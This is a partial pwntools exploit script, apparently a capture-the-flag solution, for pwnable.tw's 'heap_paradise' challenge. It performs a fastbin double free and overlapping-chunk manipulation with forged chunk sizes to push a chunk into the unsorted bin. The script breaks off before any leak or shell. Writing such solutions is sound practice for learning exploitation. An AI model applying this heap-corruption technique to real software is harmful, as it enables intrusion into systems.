from pwn import *

locdbg=True

host='chall.pwnable.tw'
port=10203
filename='./heap_paradise'
libcname='./libc_64.so.6'
elf=ELF(filename)
slpt=0.2

if locdbg:
    p=process(filename)
    libc=ELF('./libc_64.so.6')
    #context.log_level='debug'
else:
    p=remote(host,port)
    libc=ELF(libcname)
    context.log_level='debug'

def pwndbg(ctt):
    if locdbg:
        gdb.attach(p,gdbscript=ctt)

def slp():
    if not locdbg:
        sleep(slpt)

def fin():
    p.interactive()

def Allocate(size, data):
    p.sendlineafter(b'You Choice:', b'1')
    p.sendlineafter(b'Size :', str(size).encode())
    p.sendafter(b'Data :', data)

def Free(index):
    p.sendlineafter(b'You Choice:', b'2')
    p.sendlineafter(b'Index :', str(index).encode())

Allocate(0x68, b'f' * 0x10 + p64(0) + p64(0x71)) # 0
Allocate(0x68, b'a' * 0x10 + p64(0) + p64(0x31) + b'a' * 0x20 + p64(0) + p64(0x21)) # 1
Free(0)
Free(1)
Free(0)



Allocate(0x68, b'\x20') # 2
Allocate(0x68, b'\0') # 3
Allocate(0x68, b'\0') # 4
Allocate(0x68, b'\0') # 5

Free(0)
pwndbg('')
Allocate(0x68, b'd' * 0x10 + p64(0) + p64(0xa1)) # 6

# unsorted bin
Free(5)

